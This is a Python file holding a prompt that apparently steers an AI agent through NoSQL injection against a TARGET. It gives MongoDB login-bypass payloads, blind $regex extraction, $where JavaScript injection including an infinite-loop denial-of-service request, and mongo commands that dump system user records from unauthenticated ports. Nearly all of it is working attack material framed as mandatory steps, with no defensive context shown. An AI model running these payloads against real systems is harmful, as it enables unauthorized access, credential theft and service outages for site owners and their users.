"""
NoSQL Injection Attack Skill Prompt.
"""
NOSQL_SKILL_PROMPT = """
## ATTACK SKILL: NOSQL INJECTION

**CRITICAL: This attack skill has been CLASSIFIED as NoSQL injection.**
**Follow the NoSQL workflow below. Do NOT switch to other attack methods**
**until you have exhausted the full detection and exploitation path.**

---

### MANDATORY NOSQL INJECTION WORKFLOW

#### STEP 1: DETECTION — Identify NoSQL Database

Look for signs of MongoDB, CouchDB, Firebase, or DynamoDB:
- JSON-based API with `$` operators in query params
- `/api/` endpoints returning JSON arrays
- Response headers: `X-Powered-By: Express` (often MongoDB + Node.js)
- Check for MongoDB default port 27017, CouchDB 5984

**Detection probes (MongoDB):**
- Send `{"$gt": ""}` instead of a string value — if results change, injectable.
- Send `{"$ne": "nonexistent"}` — returns all documents if injectable.
- Send `{"$where": "1"}` — if accepted, JavaScript injection possible.

#### STEP 2: AUTHENTICATION BYPASS (MongoDB)

**Login bypass payloads:**
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrong"}}
```

#### STEP 3: DATA EXTRACTION (MongoDB)

**Blind extraction via $regex:**
```json
{"username": {"$regex": "^a"}}  →  check if user starting with 'a' exists
{"username": {"$regex": "^ad"}}  →  narrow down character by character
```

**$where JavaScript injection (if enabled):**
```json
{"$where": "sleep(5000) || true"}  →  time-based detection
{"$where": "this.password.length > 0"}  →  data exfiltration
{"$where": "return true"}  →  dump all documents
```

#### STEP 4: MONGODB-SPECIFIC ATTACKS

**Unauthenticated admin interface (port 27017):**
```bash
mongo --host TARGET --port 27017
> show dbs
> use admin
> db.system.users.find()
```

**Server-side JavaScript execution:**
```bash
# If $where is enabled and you have an injection point:
curl -X POST http://TARGET/api/search -d '{"query": {"$where": "while(true){}"}}'
```

#### ANTI-PATTERNS (DO NOT DO):
- Do NOT only test MongoDB syntax — CouchDB, DynamoDB, and Firebase have different injection patterns.
- Do NOT forget to check for unauthenticated database ports.
- Do NOT use $regex brute-force without checking if the app has rate limiting.
"""
